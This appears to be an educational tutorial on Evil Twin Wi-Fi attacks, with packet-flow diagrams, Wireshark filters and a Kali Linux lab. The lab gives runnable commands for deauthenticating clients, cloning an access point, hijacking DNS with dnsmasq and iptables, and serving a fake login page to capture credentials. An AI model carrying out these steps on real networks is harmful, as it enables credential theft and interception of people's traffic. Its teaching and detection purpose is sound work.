Step-by-step **packet flow** of a typical **Evil Twin Wi-Fi Attack**, with each phase broken down into **packet-level events** that you can observe in Wireshark or simulate in a lab.

---

#### 🧨 Evil Twin Wi-Fi Attack – Packet Flow Breakdown

---

#### 👿 What Is an Evil Twin Attack?

An **Evil Twin** is a **rogue Wi-Fi Access Point (AP)** that mimics a legitimate AP's SSID and MAC address to trick users into connecting — allowing attackers to **steal credentials, hijack sessions, or inject malware**.

---

## 📶 Attack Setup Overview

| Phase      | Goal                                            | Tools Typically Used                 |
| ---------- | ----------------------------------------------- | ------------------------------------ |
| 1. Recon   | Capture AP details (SSID, BSSID, channel)       | `airodump-ng`, `Wireshark`           |
| 2. Clone   | Start fake AP with same SSID                    | `airbase-ng`, `hostapd`              |
| 3. Deauth  | Disconnect users from real AP                   | `aireplay-ng`, `mdk3`, `hcxdumptool` |
| 4. Capture | Intercept handshake / credentials               | `Wireshark`, `aircrack-ng`           |
| 5. Exploit | Phish user on captive portal or crack handshake | Browser phishing, WPA cracking       |

---

#### 🔄 Evil Twin Attack Packet Flow (WPA2 Scenario)

```
📡 LEGITIMATE AP: BSSID 00:11:22:33:44:55
🎭 EVIL TWIN AP:   BSSID 00:11:22:33:44:55 (spoofed)
```

---

#### 🧭 1. Reconnaissance

**Attacker captures beacon frames**:

```
[BEACON] From: 00:11:22:33:44:55  SSID: "CorpNet"
→ Broadcast every 100 ms by real AP
→ Contains supported rates, encryption (WPA2), channel, etc.
```

Tool: `airodump-ng`

---

#### 💥 2. Deauthentication (Force Disconnect)

**Spoofed Deauth Frame**:

```
[DEAUTH] From: 00:11:22:33:44:55  To: Victim MAC
Reason: Class 3 frame received from nonassociated STA
```

* Sent repeatedly to force client to disconnect from legit AP.
* Clients begin scanning for the same SSID.

Tool: `aireplay-ng --deauth`

---

#### 🎭 3. Fake AP Starts Broadcasting

**Evil Twin AP sends spoofed beacon frames**:

```
[BEACON] From: 00:11:22:33:44:55  SSID: "CorpNet"
→ Same SSID & BSSID, stronger signal
→ Optional: No password (open) or same WPA2 passphrase
```

Tool: `airbase-ng`, `hostapd`

---

#### 📡 4. Client Reconnects to Evil Twin

**Authentication & Association**

```
[AUTH] From: Victim → AP (00:11:22:33:44:55)
[ASSOC REQUEST] → SSID: "CorpNet"
[ASSOC RESPONSE] ← Success
```

Victim thinks it reconnected to the original AP.

---

#### 🧷 5. Capture Handshake or Redirect to Phishing Page

#### 🔹 Option A: Capture WPA2 4-Way Handshake

If Evil Twin uses WPA2 with same passphrase:

```
[EAPOL Msg 1] ← From AP: ANonce
[EAPOL Msg 2] → From Client: SNonce + MIC
[EAPOL Msg 3] ← From AP: GTK + MIC
[EAPOL Msg 4] → From Client: ACK
```

Use for **offline cracking** with `aircrack-ng`, `hashcat`.

---

#### 🔹 Option B: Fake Open Network + Captive Portal

Fake AP is **open**, redirects DNS/web traffic:

```
[DNS Request] → google.com
[DNS Response] ← 192.168.1.1 (fake gateway)

[HTTP GET] Victim opens browser
→ Fake login portal (phishing)
→ Attacker logs credentials
```

Tool: `CaptivePortal`, `Wifiphisher`

---

#### 🧑‍💻 6. Post-Connect Exploitation

Once the victim is connected:

* DNS spoofing
* SSL stripping
* MITM (e.g., `ettercap`, `bettercap`)
* Malware injection

---

#### 📊 Evil Twin Packet Flow Summary Table

| Step | Packet Type         | Source              | Destination | Purpose                           |
| ---- | ------------------- | ------------------- | ----------- | --------------------------------- |
| 1    | Beacon              | Legit AP            | Broadcast   | Advertise real SSID               |
| 2    | Beacon              | Evil Twin AP        | Broadcast   | Clone SSID/BSSID                  |
| 3    | Deauth              | Evil Twin (spoofed) | Client      | Kick client off real AP           |
| 4    | Auth/Assoc Req/Resp | Client ↔ Evil AP    |             | Connect to fake AP                |
| 5    | EAPOL Msgs          | Client & Evil AP    |             | Capture WPA2 handshake (optional) |
| 6    | DNS/HTTP Redirect   | Client → Evil AP    |             | Show fake login page / MITM       |

---

#### 🧪 Wireshark Filters for Analysis

```bash
wlan.fc.subtype == 0x08     # Beacon frames
wlan.fc.subtype == 0x0c     # Deauth frames
eapol                        # WPA Handshake messages
http || dns                  # Captive portal / phishing
```

---


**Step-by-Step Evil Twin Wi-Fi Attack lab** using **Kali Linux**, designed for educational and authorized environments like 

**lab testing, ethical hacking training**, or **CTF practice**.

> ⚠️ **Important**: This is for **educational purposes only**. Unauthorized use of these techniques on real networks is **illegal** and unethical.

---

#### 🧪 Evil Twin Wi-Fi Attack Lab using Kali Linux

---

#### 🧰 Tools You’ll Need

| Tool          | Purpose                      |
| ------------- | ---------------------------- |
| `airmon-ng`   | Enable monitor mode          |
| `airodump-ng` | Discover networks/clients    |
| `aireplay-ng` | Deauthentication attack      |
| `airbase-ng`  | Create fake AP               |
| `dnsmasq`     | DNS/DHCP for captive portal  |
| `hostapd`     | Alternative to `airbase-ng`  |
| `wifiphisher` | All-in-one Evil Twin toolkit |
| `iptables`    | NAT and redirection rules    |

---

#### 🌐 Lab Setup

#### Requirements:

* One **Kali Linux** machine with **Wi-Fi adapter** that supports monitor and injection mode (e.g., ALFA AWUS036NHA).
* Another device (phone/laptop) to connect as **victim**.
* Isolated test environment or Faraday cage.

---

## 🔁 Step-by-Step Instructions

---

#### 🔹 Step 1: Enable Monitor Mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

> This puts `wlan0` into monitor mode as `wlan0mon`.

---

#### 🔹 Step 2: Scan for Target Network

```bash
sudo airodump-ng wlan0mon
```

* Note down:

  * **SSID**
  * **BSSID (MAC)**
  * **Channel**
  * **Client MAC (optional)**

---

#### 🔹 Step 3: Deauthenticate Clients from Real AP

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client MAC> wlan0mon
```

* This forces the client to disconnect.
* You can omit `-c` to deauth all.

---

#### 🔹 Step 4: Set Up Evil Twin AP

```bash
sudo airbase-ng -e "CorpNet" -c <Channel> wlan0mon
```

* This clones the SSID on the same channel.
* A new interface like `at0` will be created.

---

#### 🔹 Step 5: Assign IP and Setup NAT

```bash
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# NAT with iptables
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
```

---

#### 🔹 Step 6: Start DHCP/DNS Server (dnsmasq)

Create `dnsmasq.conf`:

```bash
interface=at0
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
```

Run:

```bash
sudo dnsmasq -C dnsmasq.conf
```

---

#### 🔹 Step 7: Create Captive Portal (Fake Login)

Create a simple HTML login page (e.g., `index.html`):

```html
<h1>Login to Continue</h1>
<form method="POST">
  <input type="text" name="username" placeholder="Username"/><br>
  <input type="password" name="password" placeholder="Password"/><br>
  <input type="submit" value="Login"/>
</form>
```

Host it with Python:

```bash
sudo python3 -m http.server 80
```

Or use a full phishing toolkit like `wifiphisher`.

---

#### 🔹 Step 8: Redirect HTTP Traffic to Captive Portal

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
```

Now when the victim connects, any web traffic will hit your fake page.

---

#### 🔹 Step 9: Monitor Captured Credentials

* If using `index.html` with POST, capture it using:

  * `tcpdump`
  * `Burp Suite`
  * A custom backend (e.g., Flask server)

---

#### ✅ Optional: Use `wifiphisher` for Automation

```bash
sudo wifiphisher
```

* Select AP to clone
* Choose phishing scenario
* Fully automated Evil Twin + credential capture

---

#### 🧪 Wireshark Filters (Monitor the Attack)

```bash
wlan.fc.type_subtype == 0x0c        # Deauth frames
wlan.fc.type_subtype == 0x08        # Beacon frames
eapol                               # Handshake capture
http || dns                         # Captive portal traffic
```

---

#### ⚠️ Legal Reminder

This lab is strictly for:

* ✅ Home lab
* ✅ Ethical hacking classes
* ✅ Red Team simulations **with permission**

> 🚫 **Never** run this on public or production networks!

---

#### Final Packet Flow Summary Table

| Step | Direction             | Protocol / Type | Packet Contents                          |
| ---- | --------------------- | --------------- | ---------------------------------------- |
| 1    | Real AP → Broadcast   | 802.11 Beacon   | SSID: CorpNet                            |
| 2    | Evil Twin → Client    | 802.11 Deauth   | Reason: Disassociation                   |
| 3    | Evil Twin → Broadcast | 802.11 Beacon   | SSID spoofed, stronger signal            |
| 4    | Client ↔ Evil Twin    | Auth/Assoc      | Association to fake AP                   |
| 5    | Evil Twin ↔ Client    | DHCP + DNS      | Assign IP + Redirect all DNS to 10.0.0.1 |
| 6    | Client ↔ Evil Twin    | HTTP GET        | Request for captive page                 |
| 7    | Client → Evil Twin    | HTTP POST       | Captured credentials sent to attacker    |
| 8    | Evil Twin → Client    | HTTP Redirect   | Fake success or redirect                 |

---

#### 🧪 Wireshark Filters

| Purpose                 | Filter Expression               |   |                  |
| ----------------------- | ------------------------------- | - | ---------------- |
| Deauthentication frames | `wlan.fc.subtype == 0x0c`       |   |                  |
| Beacon spoofing         | `wlan.fc.subtype == 0x08`       |   |                  |
| DHCP traffic            | \`udp.port == 67                |   | udp.port == 68\` |
| DNS queries/responses   | `udp.port == 53`                |   |                  |
| Captive login POST      | `http.request.method == "POST"` |   |                  |
| All HTTP traffic        | `http`                          |   |                  |



#### Packet Flow Summary: Victim Trying to Reach google.com via Evil Twin

| 🔢 Step | 🧭 Protocol | 🎯 Source            | 🛑 Destination  | 📥 Gateway Involved? | 📝 Description                        |
| ------: | ----------- | -------------------- | --------------- | -------------------- | ------------------------------------- |
|       1 | 802.11      | Client               | Evil Twin (AP)  | 🚫 No (Wi-Fi layer)  | Wi-Fi Auth/Assoc to fake AP           |
|       2 | DHCP        | Client               | 255.255.255.255 | ✅ Yes                | DHCP Discover broadcast               |
|       3 | DHCP        | Evil Twin            | Client          | ✅ Yes                | DHCP Offer → IP/DNS = 10.0.0.1        |
|       4 | DNS (UDP)   | Client (10.0.0.10)   | 10.0.0.1        | ✅ Yes                | DNS Query: `google.com`               |
|       5 | DNS (UDP)   | Evil Twin (10.0.0.1) | Client          | ✅ Yes                | DNS Response: `google.com` → 10.0.0.1 |
|       6 | HTTP GET    | Client               | 10.0.0.1        | ✅ Yes                | HTTP GET `/` → Fake login             |
|       7 | HTTP 200 OK | Evil Twin            | Client          | ✅ Yes                | Serve `index.html` fake page          |
|       8 | HTTP POST   | Client               | 10.0.0.1        | ✅ Yes                | Submit credentials to `/login`        |
|       9 | HTTP 301    | Evil Twin            | Client          | ✅ Yes                | Redirect to `/success` or real site   |
|      10 | HTTPS GET   | Client               | 10.0.0.1        | ✅ Yes (Blocked)      | TLS handshake fails → browser blocks  |

---

#### 🔎 Wireshark Filters to Watch the Flow

udp.port == 53                     # DNS traffic
http.request.uri contains "google" # Fake GET requests
http.request.method == "POST"      # Credential capture
ip.addr == 10.0.0.1                # Evil Twin server traffic

#### Flow Diagram – Evil Twin Attack (Captive Portal)

### 📈 Evil Twin Attack Flow – Victim Attempts to Access `google.com`

```text
+-------------------+                          +---------------------+                          +------------------+
|   Victim Device   |                          |  Evil Twin Gateway  |                          |  Real Google.com |
|   (10.0.0.10)     |                          |    (10.0.0.1)        |                          |  (Not Reached)   |
+-------------------+                          +---------------------+                          +------------------+
        |                                                  |                                             
        |---------(1) Auth/Assoc Request ----------------->|   ❌ Wi-Fi control (no IP involved)
        |<--------(2) Assoc Response ----------------------|                                               
        |                                                  |                                             
        |---------(3) DHCP Discover ---------------------->|   ✅ Fake gateway responds
        |<--------(4) DHCP Offer (IP+DNS = 10.0.0.1) ------|                                               
        |                                                  |
        |---------(5) DNS Query: google.com ------------->|   ✅ DNS hijacked
        |<--------(6) DNS Reply: google.com = 10.0.0.1 ---|                                               
        |                                                  |
        |---------(7) HTTP GET / (to google.com) -------->|   ✅ Sent to attacker's web server
        |<--------(8) HTTP 200 OK + Fake Login Page ------|                                               
        |                                                  |
        |---------(9) HTTP POST /login ------------------->|   ✅ Username & Password captured
        |<--------(10) HTTP 301 Redirect -----------------|   (optional redirect)
        |                                                  |
        |---------(11) HTTPS GET (to google.com) --------->|   ✅ SSL/TLS handshake attempt
        |<--------(12) TLS Cert Error (browser blocks) ---|   🔒 User sees warning (not Google)
        |                                                  |
        x------------ No packets go to real Google.com ----x   🌐 Blocked

---

```text
+-------------------+             +----------------------+             +------------------------+
|   Victim Device   |             |   Evil Twin Gateway  |             |     Real google.com    |
|   (10.0.0.10)     |             |   (10.0.0.1 / eth0)   |             |     (142.250.x.x)       |
+-------------------+             +----------------------+             +------------------------+
        |                                      |                                      |
        |--------(1) DHCP Discover ----------->|                                      |
        |<-------(2) DHCP Offer ---------------|   IP, DNS, Gateway = 10.0.0.1        |
        |                                      |                                      |
        |--------(3) DNS Query: google.com --->|                                      |
        |<-------(4) DNS Reply: Real IP -------| → google.com = 142.250.190.14        |
        |                                      |                                      |
        |--------(5) TCP SYN to 142.250.x.x -->|                                      |
        |                                      |--------(6) TCP SYN ----------------->|
        |                                      |<-------(7) SYN-ACK ------------------|
        |<-------(8) SYN-ACK ------------------|                                      |
        |--------(9) ACK --------------------->|--------(10) ACK -------------------->|
        |                                      |                                      |
        |--------(11) TLS Client Hello ------->|--------(12) TLS Client Hello ------->|
        |<-------(13) TLS Server Hello --------|<-------(14) TLS Server Hello --------|
        |                                      |                                      |
        |--------(15) Encrypted HTTPS traffic->|--------(16) Forward to Google ------>|
        |<-------(17) Encrypted response <-----|<-------(18) From Google -------------|
        |                                      |                                      |

```
---

#### 🧠 Summary:

| Stage            | Interception Type         | Packet Direction            |
| ---------------- | ------------------------- | --------------------------- |
| Wi-Fi Connect    | Fake Auth/Assoc           | Local wireless only         |
| DHCP Assignment  | Evil Twin responds        | Victim → 10.0.0.1           |
| DNS Spoofing     | google.com → 10.0.0.1     | Victim → 10.0.0.1           |
| HTTP Hijack      | Fake login page served    | Victim ←→ 10.0.0.1          |
| Credential Theft | POST intercepted & logged | Victim → 10.0.0.1           |
| HTTPS Blocked    | TLS error (no real cert)  | Victim → 10.0.0.1 (blocked) |
